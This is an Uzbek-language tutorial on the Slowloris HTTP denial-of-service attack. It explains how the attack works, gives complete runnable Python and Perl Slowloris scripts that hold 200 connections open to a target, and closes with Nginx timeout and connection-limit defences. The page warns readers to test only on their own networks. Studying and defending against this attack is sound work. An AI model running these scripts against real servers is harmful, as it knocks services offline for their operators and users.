# Slowloris

HTTP connection ochib, requestni juda sekin tugatib, server connection pool'ini bloklash hujumi.

---

## Tushuntirish

```text
Normal HTTP:
Client → GET / HTTP/1.1\r\n\r\n → Server
Server: Javob beradi ✓

Slowloris:
Client → GET / HTTP/1.1\r\n → Server (tugatmaydi)
Client → X-Header: aaa\r\n → Server (sekin qo'shadi)
Client → X-Header: bbb\r\n → Server (sekin qo'shadi)
... (soatlab davom etadi)
Server: Connection pool to'ldi ❌
```

---

## ⚠️ Ogohlantirish

**Faqat o'z tarmog'ingizda sinang!**

---

## Amaliy hujum (o'rganish uchun)

### Slowloris (Python)

```python
import socket
import time
import threading

class Slowloris:
    """Slowloris hujumi - faqat o'z tarmog'ingizda sinang!"""
    
    def __init__(self, target, port=80, num_connections=200):
        self.target = target
        self.port = port
        self.num_connections = num_connections
        self.sockets = []
        self.running = False
    
    def create_socket(self):
        """Yangi socket yaratish"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            # HTTP request boshlash (tugatmaslik)
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
            
            self.sockets.append(sock)
            return True
        except Exception as e:
            return False
    
    def keep_alive(self, sock):
        """Socket ni jonli saqlash"""
        while self.running:
            try:
                # Sekin header yuborish
                sock.send(f"X-a{int(time.time())}: b\r\n".encode())
                time.sleep(15)
            except:
                break
    
    def start(self):
        """Hujumni boshlash"""
        self.running = True
        
        print(f"[*] Slowloris boshlandi: {self.target}:{self.port}")
        print(f"[*] {self.num_connections} ta connection yaratilmoqda...")
        
        # Connectionlar yaratish
        for i in range(self.num_connections):
            if self.create_socket():
                if (i + 1) % 50 == 0:
                    print(f"[*] {i + 1}/{self.num_connections} connections")
            time.sleep(0.1)
        
        print(f"[*] {len(self.sockets)} ta connection yaratildi")
        print("[*] Keep-alive boshlandi (CTRL+C to'xtatish)")
        
        # Keep-alive threads
        threads = []
        for sock in self.sockets:
            t = threading.Thread(target=self.keep_alive, args=(sock,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Kutish
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Hujumni to'xtatish"""
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        print(f"[*] Hujum to'xtatildi. {len(self.sockets)} ta connection yopildi")

# Ishlatish (faqat o'z tarmog'ingizda!)
if __name__ == "__main__":
    TARGET = "192.168.1.100"  # Target server
    PORT = 80                 # HTTP port
    CONNECTIONS = 200         # Connection soni
    
    print("⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!")
    print("⚠️  CTRL+C to'xtatish uchun")
    
    slowloris = Slowloris(TARGET, PORT, CONNECTIONS)
    slowloris.start()
```

### slowloris (Perl)

```perl
#!/usr/bin/perl
use IO::Socket::INET;

# Faqat o'z tarmog'ingizda sinang!
my $target = "192.168.1.100";
my $port = 80;
my $num_connections = 200;

my @sockets;
for (1..$num_connections) {
    my $sock = IO::Socket::INET->new(
        PeerAddr => $target,
        PeerPort => $port,
        Proto => 'tcp',
        Timeout => 5
    );
    
    if ($sock) {
        print $sock "GET / HTTP/1.1\r\nHost: $target\r\n";
        push @sockets, $sock;
        print "Connection $_ established\n";
    }
    
    select(undef, undef, undef, 0.1);
}

print scalar(@sockets) . " connections established\n";

# Keep-alive
while (1) {
    for my $sock (@sockets) {
        eval {
            print $sock "X-a: " . time() . "\r\n";
        };
        select(undef, undef, undef, 15);
    }
}
```

---

## Himoya

### 1. Request Timeout

```nginx
# Nginx
client_body_timeout 10s;
client_header_timeout 10s;
keepalive_timeout 15s;
send_timeout 10s;
```

### 2. Connection Limit

```nginx
# Nginx
limit_conn_zone $binary_remote_addr zone=conn:10m;

server {
    location / {
        limit_conn conn 10;  # Har bir IP uchun 10 ta connection
    }
}
```

### 3. Reverse Proxy

```text
Nginx / Cloudflare:
- Connection larni boshqaradi
- Slowloris ni to'xtatadi
- Faqat to'g'ri requestlarni o'tkazadi
```

### 4. Monitoring

```bash
# Active connections ni kuzatish
ss -tan state established | wc -l

# Agar juda ko'p bo'lsa → Slowloris
```

---

## Xulosa

- Slowloris sekin HTTP connection hujumi
- Connection pool ni bloklash maqsadi
- Request Timeout, Connection Limit, Reverse Proxy bilan himoya
